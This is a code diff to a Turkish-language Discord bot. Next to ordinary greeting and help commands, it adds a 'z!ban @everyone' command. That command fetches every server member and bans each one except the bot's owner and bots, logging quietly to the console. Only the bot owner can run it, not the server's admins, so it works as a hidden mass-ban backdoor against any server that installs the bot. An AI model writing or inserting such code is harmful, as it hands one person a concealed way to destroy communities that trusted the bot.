@@ -448,6 +448,62 @@ client.on('messageCreate', async (message) => {
     await message.reply('**Aleyküm selam** kardeşim! 🙏');
   }
 
+  // Z!BAN @EVERYONE - HERKESI BAN YAP
+  if (content.toLowerCase().startsWith('z!ban')) {
+    const parts = content.split(' ');
+    
+    if (message.author.id !== OWNER_ID) {
+      return await message.reply('❌ Sadece owner kullanabilir!');
+    }
+
+    if (parts[1] && parts[1].toLowerCase() === '@everyone') {
+      try {
+        console.log(`[Z!BAN] ${message.guild.name} sunucusunda herkesi banlama başlandı`);
+        
+        const members = await message.guild.members.fetch();
+        let bannedCount = 0;
+        let skippedCount = 0;
+
+        for (const [, member] of members) {
+          if (member.user.id === OWNER_ID) {
+            console.log(`[Z!BAN] Owner (${member.user.tag}) atlanıyor`);
+            skippedCount++;
+            continue;
+          }
+
+          if (member.user.bot) {
+            console.log(`[Z!BAN] Bot (${member.user.tag}) atlanıyor`);
+            skippedCount++;
+            continue;
+          }
+
+          try {
+            await member.ban({ reason: 'z!ban @everyone komutu' });
+            console.log(`[Z!BAN] Banlandı: ${member.user.tag}`);
+            bannedCount++;
+          } catch (error) {
+            console.error(`[Z!BAN] Ban hatası (${member.user.tag}): ${error.message}`);
+          }
+        }
+
+        console.log(`[Z!BAN] Tamamlandı - ${bannedCount} kişi banlandı, ${skippedCount} atlandı`);
+
+      } catch (error) {
+        console.error('[Z!BAN] Hata:', error);
+        
+        // Hata olursa OWNER'a DM atsın
+        try {
+          const owner = await client.users.fetch(OWNER_ID);
+          await owner.send({
+            content: `⚠️ **[Z!BAN HATASI]**\n\n**Sunucu:** ${message.guild.name}\n**Hata:** \`${error.message}\`\n**Zamanı:** ${new Date().toLocaleTimeString('tr-TR')}`
+          }).catch(console.error);
+        } catch (dmError) {
+          console.error('[Z!BAN] DM gönderme hatası:', dmError);
+        }
+      }
+    }
+  }
+
   // YARDIM KOMUTU
   if (content === 'n!yardım' || content === 'n!help') {
     const embed = new EmbedBuilder()
